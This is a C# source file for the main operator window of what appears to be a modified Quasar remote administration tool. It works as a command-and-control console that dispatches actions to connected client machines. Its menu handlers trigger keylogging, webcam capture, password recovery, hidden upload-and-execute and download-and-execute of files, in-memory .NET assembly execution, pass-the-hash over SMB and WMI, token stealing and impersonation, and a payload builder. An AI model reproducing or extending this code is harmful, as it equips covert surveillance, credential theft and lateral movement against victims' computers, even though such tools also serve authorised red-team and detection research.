﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.Commands;
using xServer.Core.Cryptography;
using xServer.Core.Data;
using xServer.Core.Extensions;
using xServer.Enums;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Networking.Utilities;
using xServer.Core.Utilities;

namespace xServer.Forms
{
    public partial class FrmMain : Form
    {
        public QuasarServer ListenServer { get; set; }
        public static FrmMain Instance { get; private set; }
        public Dictionary<string, Impersonation> impersonatedUsers = new Dictionary<string, Impersonation>();
       

        private const int STATUS_ID = 4;
        private const int USERSTATUS_ID = 5;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview

        private void ShowTermsOfService()
        {
            using (var frm = new FrmTermsOfUse())
            {
                frm.ShowDialog();
            }
            Thread.Sleep(300);
        }

        public FrmMain()
        {
            Instance = this;

            AES.SetDefaultKey(Settings.Password);

#if !DEBUG
            if (Settings.ShowToU)
                ShowTermsOfService();
#endif

            InitializeComponent();
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            ListenServer = new QuasarServer();

            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen && Settings.UseUPnP)
            {
                UPnP.Initialize(Settings.ListenPort);
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support);
            }
            else if (Settings.AutoListen)
            {
                UPnP.Initialize();
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support);
            }
            else
            {
                UPnP.Initialize();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();
            AutostartListening();
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UPnP.DeletePortMap(Settings.ListenPort);
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
            Instance = null;
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        private void ServerState(Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    if (!listening)
                        lstClients.Items.Clear();
                    listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        /// <summary>
        /// Sets the tooltip text of the listview item of a client.
        /// </summary>
        /// <param name="client">The client on which the change is performed.</param>
        /// <param name="text">The new tooltip text.</param>
        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Adds a connected client to the Listview.
        /// </summary>
        /// <param name="client">The client to add.</param>
        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                // this " " leaves some space between the flag-icon and first item
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, client.Value.Tag,
                    client.Value.UserAtPc, client.Value.Version, "Connected", "Active", client.Value.CountryWithCode,
                    client.Value.OperatingSystem, client.Value.AccountType
                }) { Tag = client, ImageIndex = client.Value.ImageIndex };

                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Add(lvi);
                    }
                });

                UpdateWindowTitle();
                QuasarServer.writeLog("New connection from client: " + client.Value.PCName, client.Value.PCName);
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Removes a connected client from the Listview.
        /// </summary>
        /// <param name="client">The client to remove.</param>
        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }
        
        /// <summary>
        /// Sets the status of a client.
        /// </summary>
        /// <param name="client">The client to update the status of.</param>
        /// <param name="text">The new status.</param>
        public void SetStatusByClient(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.SubItems[STATUS_ID].Text = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the user status of a client.
        /// </summary>
        /// <param name="client">The client to update the user status of.</param>
        /// <param name="userStatus">The new user status.</param>
        public void SetUserStatusByClient(Client client, UserStatus userStatus)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Gets the Listview item which belongs to the client. 
        /// </summary>
        /// <param name="client">The client to get the Listview item of.</param>
        /// <returns>Listview item of the client.</returns>
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker) delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        /// <summary>
        /// Gets all selected clients.
        /// </summary>
        /// <returns>An array of all selected Clients.</returns>
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        /// <summary>
        /// Gets all connected clients.
        /// </summary>
        /// <returns>An array of all connected Clients.</returns>
        private Client[] GetConnectedClients()
        {
            return ListenServer.ConnectedClients;
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="c">The client.</param>
        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;
                    
                    notifyIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Connection"

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        if (Core.Data.Update.UseDownload)
                        {
                            foreach (Client c in GetSelectedClients())
                            {
                                QuasarServer.writeLog("Pushing update to client: " + c.Value.PCName, c.Value.PCName);
                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Data.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                            }
                        }
                        else
                        {
                            new Thread(() =>
                            {
                                bool error = false;
                                foreach (Client c in GetSelectedClients())
                                {
                                    if (c == null) continue;
                                    if (error) continue;

                                    FileSplit srcFile = new FileSplit(Core.Data.Update.UploadPath);
                                    if (srcFile.MaxBlocks < 0)
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }

                                    int id = FileHelper.GetNewTransferId();

                                    CommandHandler.HandleSetStatus(c,
                                        new Core.Packets.ClientPackets.SetStatus("Uploading file..."));

                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                    {
                                        byte[] block;
                                        if (!srcFile.ReadBlock(currentBlock, out block))
                                        {
                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                            error = true;
                                            break;
                                        }
                                        new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, string.Empty, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                    }
                                }
                            }).Start();
                        }
                    }
                }
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                QuasarServer.writeLog("Re-establishing connection to client", c.Value.PCName);
                new Core.Packets.ServerPackets.DoClientReconnect().Execute(c);
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                QuasarServer.writeLog("Disconnecting from client", c.Value.PCName);
                new Core.Packets.ServerPackets.DoClientDisconnect().Execute(c);
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    QuasarServer.writeLog(string.Format("Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back! [YES]", lstClients.SelectedItems.Count),c.Value.PCName);
                    QuasarServer.writeLog("Uninstalling client from " + c.Value.PCName, c.Value.PCName);
                    new Core.Packets.ServerPackets.DoClientUninstall().Execute(c);
                }
            }
        }

        #endregion

        #region "Host"

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmProxy != null)
                {
                    c.Value.FrmProxy.Focus();
                    return;
                }

                FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                frmRS.Show();
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                QuasarServer.writeLog("Shutting Down Client PC", c.Value.PCName);
                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Shutdown).Execute(c);
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                QuasarServer.writeLog("Restarting Client PC", c.Value.PCName);
                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Restart).Execute(c);
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                QuasarServer.writeLog("Putting Client PC in Standby Mode", c.Value.PCName);
                new Core.Packets.ServerPackets.DoShutdownAction(ShutdownAction.Standby).Execute(c);
            }
        }
        private void sMBExecToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    var frm = new FrmPTH(c, "SMB");
                    frm.Text = "Pass the Hash (SMB)";
                    frm.Activate();
                    frm.Show();
                }
            }
        }

        private void sHELLWINDOWSToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void systemInformationToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmSi != null)
                {
                    c.Value.FrmSi.Focus();
                    return;
                }
                FrmSystemInformation frmSI = new FrmSystemInformation(c);
                frmSI.Show();
            }
        }

        private void askToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                QuasarServer.writeLog("Attempting to Elevate (DoAskElevate())", c.Value.PCName);
                new Core.Packets.ServerPackets.DoAskElevate().Execute(c);
            }
        }

        private void fileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmFm != null)
                {
                    c.Value.FrmFm.Focus();
                    return;
                }
                FrmFileManager frmFM = new FrmFileManager(c);
                frmFM.Show();
            }
        }

        private void startupManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmStm != null)
                {
                    c.Value.FrmStm.Focus();
                    return;
                }
                FrmStartupManager frmStm = new FrmStartupManager(c);
                frmStm.Show();
            }
        }

        private void remoteShellToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRs != null)
                {
                    c.Value.FrmRs.Focus();
                    return;
                }
                FrmRemoteShell frmRS = new FrmRemoteShell(c);
                frmRS.Show();
            }
        }

        private void taskManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmTm != null)
                {
                    c.Value.FrmTm.Focus();
                    return;
                }
                FrmTaskManager frmTM = new FrmTaskManager(c);
                frmTM.Show();
            }
        }

        private void tCPConnectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmCon != null)
                {
                    c.Value.FrmCon.Focus();
                    return;
                }

                FrmConnections frmCON = new FrmConnections(c);
                frmCON.Show();
            }
        }

        private void registryEditorToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    if (c.Value.FrmRe != null)
                    {
                        c.Value.FrmRe.Focus();
                        return;
                    }

                    FrmRegistryEditor frmRE = new FrmRegistryEditor(c);
                    frmRE.Show();
                }
            }
        }

        #endregion

        #region "Surveillance"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRdp != null)
                {
                    c.Value.FrmRdp.Focus();
                    return;
                }
                FrmRemoteDesktop frmRDP = new FrmRemoteDesktop(c);
                frmRDP.Show();
            }
        }
        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmWebcam != null)
                {
                    c.Value.FrmWebcam.Focus();
                    return;
                }
                FrmRemoteWebcam frmWebcam = new FrmRemoteWebcam(c);
                frmWebcam.Show();
            }
        }
        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmPass != null)
                {
                    c.Value.FrmPass.Focus();
                    return;
                }

                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients());
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmKl != null)
                {
                    c.Value.FrmKl.Focus();
                    return;
                }
                FrmKeylogger frmKL = new FrmKeylogger(c);
                frmKL.Show();
            }
        }

        #endregion

        #region "Miscellaneous"

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                {
                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
                    {
                        new Thread(() =>
                        {
                            bool error = false;
                            foreach (Client c in GetSelectedClients())
                            {
                                if (c == null) continue;
                                if (error) continue;
                                QuasarServer.writeLog("Executing Local File: " + UploadAndExecute.FilePath, c.Value.PCName);
                                FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
                                if (srcFile.MaxBlocks < 0)
                                {
                                    QuasarServer.writeLog("Error Reading File: " + UploadAndExecute.FilePath + " (" + srcFile.LastError + ")", c.Value.PCName);
                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                        "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    error = true;
                                    break;
                                }

                                int id = FileHelper.GetNewTransferId();
                                QuasarServer.writeLog("Uploading File", c.Value.PCName);
                                CommandHandler.HandleSetStatus(c,
                                    new Core.Packets.ClientPackets.SetStatus("Uploading file..."));

                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                {
                                    byte[] block;
                                    if (srcFile.ReadBlock(currentBlock, out block))
                                    {
                                        new Core.Packets.ServerPackets.DoUploadAndExecute(id,
                                            Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
                                            currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                    }
                                    else
                                    {
                                        QuasarServer.writeLog("Error Reading File: " + UploadAndExecute.FilePath + " (" + srcFile.LastError + ")", c.Value.PCName);
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }
                                }
                            }
                        }).Start();
                    }
                }
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            QuasarServer.writeLog("Executing File from Web: " + DownloadAndExecute.URL, c.Value.PCName);
                            new Core.Packets.ServerPackets.DoDownloadAndExecute(DownloadAndExecute.URL,
                                DownloadAndExecute.RunHidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            QuasarServer.writeLog("Visiting Website: " + VisitWebsite.URL, c.Value.PCName);
                            new Core.Packets.ServerPackets.DoVisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            QuasarServer.writeLog("Showing Message Box with message \"" + Messagebox.Text + "\"", c.Value.PCName);
                            new Core.Packets.ServerPackets.DoShowMessageBox(
                                Messagebox.Caption, Messagebox.Text, Messagebox.Button, Messagebox.Icon).Execute(c);
                        }
                    }
                }
            }
        }

        #endregion

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion

        private void openChatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                    foreach (Client c in GetSelectedClients())
                    {
                        new Core.Packets.ServerPackets.DoStartChat().Execute(c);
                        var frm = new FrmChatLog(c);
                    frm.Activate();
                    frm.Show();
                        
                    }
            }
        }

        private void statusStrip_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void situationalAwarenessToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void viewLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    MessageBox.Show(c.Value.PCName);
                    //new Core.Packets.ServerPackets.DoStartChat().Execute(c);
                    var frm = new frmClientLog(c);
                    frm.Activate();
                    frm.Show();
                }
            }
        }

        private void wMIExecToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            //This is fine for now, need to re-code this to be fine when selecting multiple items.
            if(lstClients.SelectedItems.Count != 0)
            {
                foreach(Client c in GetSelectedClients())
                {
                    var frm = new FrmPTH(c, "WMI");
                    frm.Text = "Pass the Hash (WMI)";
                    frm.Activate();
                    frm.Show();
                }
            }
        }

        private void runLocalWMICommandToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Sorry this feature is not yet enabled!");
        }

        private void wMIToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void hostFileToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void nETAssemblyInMemoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //Client executes but crashes, why?
            //Tried running again, didn't crash. Wonder why?
            //Can't run form multiple times?
            //Maybe it was because of the dual threading.
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                {
                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
                    {
                        new Thread(() =>
                        {
                            bool error = false;
                            foreach (Client c in GetSelectedClients())
                            {
                                if (c == null) continue;
                                if (error) continue;
                                QuasarServer.writeLog("Reflectively Executing .NET Assembly.", c.Value.PCName);
                                try
                                {
                                    FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath); //New File Split
                                    if (srcFile.MaxBlocks < 0)
                                    {
                                        QuasarServer.writeLog("Error Reading File: " + UploadAndExecute.FilePath + " (" + srcFile.LastError + ")", c.Value.PCName); //Write Log
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Show message box on failure.
                                        error = true;
                                        break;
                                    }
                                    int id = FileHelper.GetNewTransferId();
                                    QuasarServer.writeLog("Uploading File", c.Value.PCName);
                                    CommandHandler.HandleSetStatus(c,
                                        new Core.Packets.ClientPackets.SetStatus("Uploading file..."));

                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                    {
                                        byte[] block;
                                        if (srcFile.ReadBlock(currentBlock, out block))
                                        {
                                            new Core.Packets.ServerPackets.DoExecuteAssembly(id,
                                                Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
                                                currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                        }
                                        else
                                        {
                                            QuasarServer.writeLog("Error Reading File: " + UploadAndExecute.FilePath + " (" + srcFile.LastError + ")", c.Value.PCName);
                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                            error = true;
                                            break;
                                        }
                                    }

                                }
                                catch (Exception _Exception)
                                {
                                    MessageBox.Show("Exception caught in process: {0}", _Exception.ToString());
                                }
                                
                              
                            }
                        }).Start();
                    }
                }
            }
        }

        private void mSWORDDDEToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void makeTokenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    var frm = new FrmImpersonate(c,true);
                    frm.Activate();
                    frm.Show();

                }
            }
        }

        private void stealProcessTokenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    var frm = new FrmImpersonate(c,false);
                    frm.Activate();
                    frm.Show();
                        
                }
            }
        }

        private void revertToSelfToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    new xServer.Core.Packets.ServerPackets.DoEnableImpersonation(false, "").Execute(c);
                }

            }
        }

        private void beginImpersonationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    if (FrmMain.Instance.impersonatedUsers.Count() == 0)
                    {
                        MessageBox.Show("Please create a token before attempting to impersonate!");
                        return;
                    }
                    FrmImpersonation frm = new FrmImpersonation(c);
                    frm.Activate();
                    frm.Show();
                }

            }

            //TODO: Set an event handler that takes the response from the make/steal token.
            //Fill a dictionary with those values and assigned to users.
            //Columns - User, Impersonation Type (Impersonation,Delegation), Handle(?)
            //Load the form and fill the box with the available tokens.
            //Actually implement the impersonation logic (and revtoself)
            //Impersonate > do stuff > Rev2Self

        }

        private void powerPickToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmPowerPick frm = new FrmPowerPick(c);
                    frm.Activate();
                    frm.Show();
                }
            }
        }
    }
}